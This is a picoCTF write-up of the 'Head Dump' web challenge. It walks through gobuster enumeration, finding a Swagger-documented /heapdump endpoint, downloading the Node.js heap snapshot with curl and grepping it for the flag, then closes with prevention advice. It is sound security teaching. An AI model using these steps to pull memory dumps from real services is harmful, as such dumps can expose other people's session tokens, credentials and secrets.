# Head Dump — Full CTF Write-Up

| Field | Details |
| :--- | :--- |
| **Platform** | picoCTF |
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Vulnerability** | Unauthenticated Node.js heap dump exposure |

---

## Challenge Overview

The application exposed a `/heapdump` diagnostic endpoint that allowed unauthenticated users to request a Node.js/V8 heap snapshot. Because heap snapshots contain runtime objects, memory variables, and strings currently held in server RAM, sensitive information such as the flag could be recovered directly from memory.

---

## Initial Clue

The challenge description indicated that the application was a blog and highlighted:
- API Documentation
- An endpoint that generates files containing the server's memory
- A secret flag hidden somewhere inside that memory

This suggested a clear enumeration strategy:
1. Enumerate the web application.
2. Find the API documentation.
3. Inspect the documented API endpoints.
4. Locate the endpoint responsible for generating the memory dump.
5. Download and analyze the dump.

---

## Enumeration

### 1. Initial Web Enumeration

The target was:
```text
http://verbal-sleep.picoctf.net:<PORT>/
```

We first used Gobuster to discover directories and files:
```bash
gobuster dir -u http://verbal-sleep.picoctf.net:<PORT>/ \
  -w /usr/share/dirb/wordlists/common.txt
```

#### Results
```text
About       (Status: 200)
about       (Status: 200)
Services    (Status: 200)
services    (Status: 200)
img         (Status: 301)
```

The generic wordlist did not discover `/api-docs`.

> [!IMPORTANT]
> **Enumeration Principle:** A tool failing to find an endpoint does not mean the endpoint does not exist. It only means the endpoint was not present in that specific wordlist.

---

### 2. API-Specific Enumeration

We then tested an API-focused SecLists wordlist:
```bash
gobuster dir \
  -u http://verbal-sleep.picoctf.net:<PORT>/ \
  -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
```

#### Results
```text
about (Status: 200)
```

Again, `/api-docs` was not discovered via brute-forcing. Instead of assuming it didn't exist, we inspected the application's HTML source.

---

### 3. Inspecting HTML Source

We extracted links and referenced resources from the page HTML:
```bash
curl -s http://verbal-sleep.picoctf.net:<PORT>/ | \
  grep -Eoi 'href="[^"]+"|src="[^"]+"'
```

Among the extracted endpoints was:
```text
href="/api-docs"
```

This immediately revealed the API documentation route.

#### Why this worked
The homepage itself contained a direct link to the API documentation, even though generic wordlists hadn't included the exact path.

This demonstrates why effective web enumeration should always combine:
* Directory and file brute-forcing
* HTML and source code inspection
* Browser DevTools inspection
* JavaScript file analysis
* Network traffic inspection

---

## API Documentation

We navigated to:
```text
http://verbal-sleep.picoctf.net:<PORT>/api-docs
```

The application rendered an interactive **Swagger UI** interface documenting the available API routes. Among the endpoints was:

```http
GET /heapdump
```

The endpoint description indicated that it was used for diagnosing memory allocation issues. This matched the challenge clue regarding memory snapshots.

---

## Exploitation

### 1. Accessing the Heap Dump

The `/heapdump` endpoint required no authentication or parameters. Executing the request through Swagger UI returned:

```http
HTTP 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="heapdump-....heapsnapshot"
```

The response confirmed that the server was serving a downloadable heap snapshot. The response header also confirmed the backend technology:
```http
X-Powered-By: Express
```

### 2. Downloading the Heap Snapshot

The snapshot could also be retrieved directly via `curl`:
```bash
curl -o heapdump.heapsnapshot \
  http://verbal-sleep.picoctf.net:<PORT>/heapdump
```

The `-o` option instructs `curl` to save the output directly to a file.

We verified the file:
```bash
ls -lh heapdump.heapsnapshot
file heapdump.heapsnapshot
```

---

## Analyzing the Heap Dump

The heap snapshot was very large, containing extensive Node.js/V8 runtime data. Dumping the entire file or using generic string searches produced an unmanageable amount of noise.

Instead, we searched specifically for the picoCTF flag format:
```bash
grep -aoE 'picoCTF\{[^}]+\}' heapdump.heapsnapshot
```

This immediately extracted the flag.

---

## Understanding the Flag Search

The regular expression used:
```text
picoCTF\{[^}]+\}
```

Matches strings adhering to the flag structure:
```text
picoCTF{something}
```

### Breakdown:
| Token | Meaning |
| :--- | :--- |
| `picoCTF` | Matches literal characters `picoCTF` |
| `\{` | Matches literal opening curly brace `{` |
| `[^}]` | Matches any character *except* `}` |
| `+` | Matches one or more repetitions of the preceding character |
| `\}` | Matches literal closing curly brace `}` |

**Overall Meaning:**
> Find any string beginning with `picoCTF{`, containing one or more characters that are not `}`, and terminating with `}`.

---

## Why `-o` Was Important

A broad search using `strings`:
```bash
strings heapdump.heapsnapshot | grep -i 'picoCTF'
```
returned multiple matches, but searching for generic terms such as `flag`:
```bash
strings heapdump.heapsnapshot | grep -i 'flag'
```
produced enormous amounts of unrelated V8 runtime output.

The optimal command was:
```bash
grep -aoE 'picoCTF\{[^}]+\}' heapdump.heapsnapshot
```

The `-o` flag instructs `grep` to:
> **Output only the matching text portion**, rather than the entire line containing the match.

Because heap snapshots store data in massive single-line JSON structures, omitting `-o` causes `grep` to dump megabytes of surrounding memory data for a single match.

---

## Tools Used

### Gobuster
Used for directory and endpoint brute-forcing:
```bash
gobuster dir -u http://TARGET/ \
  -w /usr/share/dirb/wordlists/common.txt
```

### SecLists
Used an API-specific wordlist for targeted route discovery:
```text
/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
```

### curl
Used to interact with web endpoints and download binary heap snapshots:
```bash
curl -s URL
curl -i URL
curl -o filename URL
```

### grep
Used to filter links from HTML source and extract matching flag patterns from memory dumps.

### Swagger UI
Used to view documented API endpoints and identify `GET /heapdump`.

---

## What I Learned

### 1. Enumeration is more than directory brute-forcing
Gobuster relies strictly on the provided wordlist. Just because a wordlist does not contain `/api-docs` does not mean the route is nonexistent. In this case, the link was present directly in the homepage HTML.

### 2. Always inspect page source
Web pages frequently reference resources not found by general wordlists:
* API documentation links
* Hidden development functionality
* Client-side JavaScript bundles
* Administrative consoles
* Configuration files and routes

A quick search can reveal hidden assets:
```bash
curl -s URL | grep -iE 'api|swagger|docs'
```

### 3. Swagger / OpenAPI documentation is invaluable
Swagger UI maps the entire accessible API surface. Instead of guessing endpoints like `/api/v1/debug` or `/dump`, Swagger documents exact routes, methods, parameters, and descriptions.

### 4. Understand command-line flags
* `curl -s`: Silent output (no progress bar).
* `grep -a`: Process a binary file as text.
* `grep -o`: Print only the matched text.
* `grep -E`: Interpret pattern as Extended Regular Expression (ERE).

Understanding individual flags allows precise tool composition without memorizing rigid commands.

### 5. Caution with Zsh Reserved Variables
> [!WARNING]
> In Zsh, the variable `path` is tied directly to the system `PATH` environment variable.
> Using `for path in ...` inside a Zsh shell overwrites your `PATH`, causing commands like `curl`, `ls`, or `nano` to immediately become unreachable.
> Always use descriptive loop variable names like `for endpoint in ...` or `for route in ...`.

---

## Why the Vulnerability Existed

The application exposed a diagnostic heap-dump endpoint:
```http
GET /heapdump
```
publicly on the internet without authentication or authorization.

Heap dumps are debugging artifacts intended exclusively for developers and system administrators. A Node.js heap snapshot contains everything stored in the V8 process memory:
* Strings and global variables
* Application state and cached data
* Session tokens, secrets, and credentials
* Internal object references

Exposing memory snapshots to unauthenticated users creates a critical information disclosure vulnerability.

---

## How to Prevent It

### 1. Never Expose Diagnostic Endpoints Publicly
Endpoints such as:
```text
/heapdump
/debug
/metrics
/profiler
```
must never be accessible over public networks.

### 2. Enforce Strict Authentication & Authorization
If diagnostic endpoints are necessary, restrict them to verified administrative roles via VPN, localhost binding, or mutual TLS:
```text
Authenticated Admin ──> Authorized Role ──> Access /heapdump
```

### 3. Disable Debug Features in Production
Ensure development and profiling tools are omitted from production builds and container deployments.

### 4. Protect In-Memory Secrets
Avoid storing sensitive keys and cleartext credentials in memory longer than necessary, and zero out secrets after use.

### 5. Perform Security Audits Prior to Release
Regularly inspect API documentation, Swagger configs, and route definitions to verify internal debug routes are not inadvertently exposed.

---

## Attack Chain

```text
Public Web Application
        │
        ▼
HTML Source Enumeration
        │
        ▼
/api-docs Discovered
        │
        ▼
Swagger UI Documentation
        │
        ▼
Locate GET /heapdump
        │
        ▼
Unauthenticated Heap Snapshot Download
        │
        ▼
Dump Process Memory (heapdump.heapsnapshot)
        │
        ▼
Regex Pattern Search (grep -aoE 'picoCTF\{[^}]+\}')
        │
        ▼
picoCTF{...} Flag Recovered
```

---

## Key Takeaway

> [!TIP]
> The primary lesson was not simply downloading `/heapdump`, but mastering the **enumeration process**:

```text
Enumerate
   ↓
Inspect HTML & Scripts
   ↓
Identify Technologies
   ↓
Discover Documentation
   ↓
Understand Route Capabilities
   ↓
Isolate Dangerous Endpoints
   ↓
Retrieve Data & Snapshot
   ↓
Analyze Memory Intelligently
```